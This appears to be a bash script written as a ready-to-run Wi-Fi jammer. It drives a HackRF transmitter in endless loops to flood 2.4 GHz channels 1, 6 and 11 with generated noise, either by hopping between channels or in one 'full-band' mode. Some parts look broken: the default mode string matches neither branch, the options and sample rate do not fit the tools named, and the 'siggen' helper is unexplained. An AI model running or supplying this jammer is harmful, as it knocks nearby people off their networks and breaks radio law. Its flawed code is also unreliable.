#!/bin/bash
# Usage: ./hackrf_jammer.sh [hop|full]

mode=${1:-hop \n 2-full}

command -v hackrf_transfer >/dev/null || { echo "Missing hackrf_transfer"; exit 1; }
command -v siggen >/dev/null || { echo "Missing siggen (for waveform generation)"; exit 1; }

trap "echo 'Stopping jammer...'; exit" SIGINT SIGTERM

# Mode: hop (channel hopper across Ch1,6,11)
if [ "$mode" == "hop" ]; then
    # Generate narrowband 20MHz waveform if missing
    if [ ! -f wifi_noise_20mhz.iq ]; then
        echo "[*] Generating 20 MHz Wi-Fi jammer waveform..."
        siggen -f 2437000000 -r 20M -n 60 -m qam64 -o wifi_noise_20mhz.iq
    fi

    echo "[*] Starting channel-hopping jammer (Ch1/6/11)..."
    channels=(2412000000 2437000000 2462000000)
    while true; do
        for ch in "${channels[@]}"; do
            echo ">> Jamming $ch Hz..."
            hackrf_transfer -t wifi_noise_20mhz.iq -f "$ch" -s 20M -a 1 -x 47 --txvga 47 -c 0
            sleep 0.3
        done
    done

# Mode: full (wideband jamming across 60MHz)
elif [ "$mode" == "full" ]; then
    # Generate wideband 60MHz waveform if missing
    if [ ! -f wifi_noise_60mhz.iq ]; then
        echo "[*] Generating 60 MHz full-band Wi-Fi jammer waveform..."
        siggen -f 2437000000 -r 60M -n 60 -m qam64 -o wifi_noise_60mhz.iq
    fi

    echo "[*] Starting full-band jammer at 2437 MHz (covers Ch1–11)..."
    while true; do
        hackrf_transfer -t wifi_noise_60mhz.iq -f 2437000000 -s 60M -a 1 -x 47 --txvga 47 -c 0
    done

else
    echo "Usage: $0 [hop|full]"
    exit 1
fi
